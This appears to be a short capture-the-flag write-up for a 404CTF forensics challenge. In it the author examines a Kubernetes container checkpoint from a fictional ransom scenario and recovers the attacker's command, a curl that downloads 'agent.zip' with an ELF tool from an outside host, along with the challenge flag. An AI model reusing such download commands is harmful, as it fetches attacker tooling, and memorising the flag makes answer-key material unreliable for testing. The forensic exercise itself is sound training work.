# Les Mystères du cluster de la Comtesse de Ségur [1/2]

> Vous rencontrez la Comtesse de Ségur au Procope. La Comtesse de Ségur a créé une entreprise de vente de livres en ligne en s'aidant du succès de ses livres pour enfants et l'a déployé sur un cluster Kubernetes.
>
> Celle-ci vous explique avoir été victime d'une demande de rançon. En effet, quelqu'un lui a volé ses livres pas encore publiés et menace de les publier sur Internet si elle ne lui paye la rançon demandée.
>
> La Comtesse vous demande d'enquêter sur la manière dont le maître chanteur a pu voler ses livres et vous donne pour cela les informations à sa disposition.
>
> Votre mission consiste à exploiter le fichier fourni pour y retrouver les traces du maître chanteur.

After unzipping the checkpoint, I glanced at each file to look for anything usefull that might look like a flag or be related to the CTF.<br>
In the file `checkpoint/pages-1.img` we find a very interresting command: `curl agent.challenges.404ctf.fr -o agent.zip` (along with mentions to a `flag.txt` file).<br>
The zip file contains the `flag.txt` and an ELF used in the second part of the challenge.

Flag: `404CTF{K8S_checkpoints_utile_pour_le_forensic}`